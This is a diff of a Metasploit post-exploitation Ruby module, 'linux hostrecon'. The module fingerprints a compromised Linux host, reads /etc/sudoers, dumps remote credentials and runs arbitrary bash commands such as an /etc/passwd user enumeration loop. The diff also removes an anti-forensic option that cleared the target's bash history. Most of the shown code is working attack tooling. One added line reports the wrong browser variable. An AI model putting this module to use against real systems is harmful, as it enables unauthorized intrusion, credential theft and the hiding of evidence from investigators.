@@ -16,8 +16,8 @@
 #
 # [ POST-EXPLOITATION MODULE DESCRIPTION ]
 # This module gathers target system information (linux distros), dump remote credentials
-# display outputs and stores it into a logfile in ~/.msf4/loot folder. this module also allows
-# users to execute a single_command in bash + read/store outputs (advanced options).
+# display outputs and stores results in a logfile in ~/.msf4/loot folder. this module also
+# allows users to execute a single_command in bash + read/store outputs (advanced options).
 #
 #
 # [ MODULE OPTIONS ]
@@ -26,7 +26,6 @@
 # Agressive system fingerprints scan?      => set AGRESSIVE_DUMP true
 # Dump remote credentials from target?     => set CREDENTIALS_DUMP true
 # The bash command to execute remotly      => set SINGLE_COMMAND for i in $(cat /etc/passwd | cut -d ':' -f1); do id $i; done
-# Clean remote bash_history command list?  => set DEL_BASH_HISTORY true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -92,7 +91,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'linux hostrecon post-module (fingerprints)',
                         'Description'   => %q{
-                                        This module gathers target system information (linux distros) dump remote credentials, display outputs and stores it into a logfile in msf4/loot folder. this module also allows users to execute a single_command in bash + read/store outputs (advanced options).
+                                        This module gathers target system information (linux distros) dump remote credentials, display outputs and store results in a logfile in ~/.msf4/loot folder. this module also allows users to execute a single_command in bash + read/store outputs (advanced options).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -101,7 +100,7 @@ class MetasploitModule < Msf::Post
                                 ],
  
                         'Version'        => '$Revision: 1.5',
-                        'DisclosureDate' => 'set 30 2017',
+                        'DisclosureDate' => '10 20 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'true',  # root privileges required?
@@ -128,15 +127,14 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptBool.new('STORE_LOOT', [false, 'Store dumped data to ~/.msf4/loot folder?', false])
+                                OptBool.new('STORE_LOOT', [false, 'Store dumped data into ~/.msf4/loot folder?', false])
                         ], self.class)
 
                 register_advanced_options(
                         [
-                                OptBool.new('AGRESSIVE_DUMP', [false, 'Agressive system fingerprints scan?', false]),
-                                OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target?', false]),
-                                OptBool.new('DEL_BASH_HISTORY', [false, 'Clean remote bash_history command list?', false]),
-                                OptString.new('SINGLE_COMMAND', [false, 'The bash command to execute remotely'])
+                                OptBool.new('AGRESSIVE_DUMP', [false, 'Run agressive system fingerprints scans?', false]),
+                                OptBool.new('CREDENTIALS_DUMP', [false, 'Dump remote credentials from target system?', false]),
+                                OptString.new('SINGLE_COMMAND', [false, 'Input one bash command to be executed remotely'])
                         ], self.class)
  
         end
@@ -168,7 +166,7 @@ def run
     sys_info = session.sys.config.sysinfo
     session_pid = client.sys.process.getpid
     #
-    # check for proper target operative system (Linux)
+    # Check for proper target operative system (Linux)
     #
     unless sysinfo['OS'] =~ /Linux/ || sysinfo['OS'] =~ /linux/
       print_error("[ABORT]: This module only works againts Linux systems ..")
@@ -189,6 +187,7 @@ def run
     if not sysinfo.nil?
       print_good("Running module against: #{sys_info['Computer']}")
       Rex::sleep(0.5)
+      print_warning("  Be patience, this may take up to 40 sec to finish ..")
     else
       print_error("[ABORT]: This module only works in meterpreter sessions!")
       return nil
@@ -198,18 +197,13 @@ def run
 
       #
       # Dump system information from target (fingerprints)
-      # Clear local variables to accept new data inputs ..
       #
       data_dump=''
-      check_opera=''
-      check_firefox=''
-      check_chromium=''
       print_status("Executing list of commands remotely ..")
       Rex::sleep(0.2)
       #
       # bash commands to be executed remotely ..
       #
-
       date_out = cmd_exec("date")
       user_name = cmd_exec("whoami")
       py_version = cmd_exec("python -V")
@@ -218,8 +212,9 @@ def run
       opera_version = cmd_exec("opera -version")
       psq_version = cmd_exec("psql -V | awk {'print $3'}")
       ruby_version = cmd_exec("ruby -v  | awk {'print $2'}")
+      chromium_version = cmd_exec("chromium --product-version")
       chrome_version = cmd_exec("google-chrome --product-version")
-      chromium_version = cmd_exec("chromium-browser --product-version")
+      chromium_browser = cmd_exec("chromium-browser --product-version")
       firefox_version = cmd_exec("firefox --version | awk {'print $3'}")
       gateway = cmd_exec("netstat -r | grep \"255.\" | awk {'print $3'}")
       interface = cmd_exec("netstat -r | grep \"default\" | awk {'print $8'}")
@@ -237,18 +232,6 @@ def run
       distro_description = cmd_exec("cat /etc/*-release | grep \"DISTRIB_DESCRIPTION=\" | cut -d '=' -f2")
       user_privs = cmd_exec("cat /etc/sudoers | grep \"#{user_name}\" | grep -v \"#\" | awk {'print $2,$3'}")
       localhost_ip = cmd_exec("ping -c 1 localhost | head -n 1 | awk {'print $3'} | cut -d '(' -f2 | cut -d ')' -f1")
-      #
-      # Try to determine chromium (browser) correct syntax command
-      #
-      chromium_check = cmd_exec("which chromium")
-      if chromium_check =~ /chromium/
-        chromium_version = cmd_exec("chromium --product-version")
-      end
-      check_other = cmd_exec("which chromium-browser")
-      if check_other =~ /chromium-browser/
-        chromium_version = cmd_exec("chromium-browser --product-version")
-      end
-
         #
         # Store data into a local variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
@@ -278,18 +261,21 @@ def run
         data_dump << "PostgreSQL version  : #{psq_version}\n"
         data_dump << "GCC version         : #{gcc_version}\n"
           #
-          # display installed browsers versions ..
+          # Display (only) remote installed browsers versions ..
           #
-          unless firefox_version =~ /not/
+          unless firefox_version =~ /not found/
             data_dump << "Firefox browser     : #{firefox_version}\n"
           end
-          unless chrome_version =~ /not/
+          unless chrome_version =~ /not found/
             data_dump << "Chrome browser      : #{chrome_version}\n"
           end
-          unless chromium_version =~ /not/
+          unless chromium_version =~ /not found/
             data_dump << "Chromium browser    : #{chromium_version}\n"
           end
-          unless opera_version =~ /not/
+          unless chromium_browser =~ /not found/
+            data_dump << "Chromium browser    : #{chromium_version}\n"
+          end
+          unless opera_version =~ /not found/
             data_dump << "Opera browser       : #{opera_version}\n"
           end
         data_dump << "Target interface    : #{interface}\n"
@@ -512,15 +498,6 @@ def run
      if datastore['STORE_LOOT'] == true
        print_good("Session logfile stored locally in: ~/.msf4/loot folder")
        store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
-       Rex::sleep(0.5)
-     end
-     #
-     # linux_hostrecon - Anti-forensic module ..
-     # This funtion will delete all entrys from remote bash shell (history command list) ..
-     #
-     if datastore['DEL_BASH_HISTORY'] == true
-       print_good("Deleted commands list from remote bash_history file")
-       cmd_exec("history -c")
        Rex::sleep(0.5)
      end
 
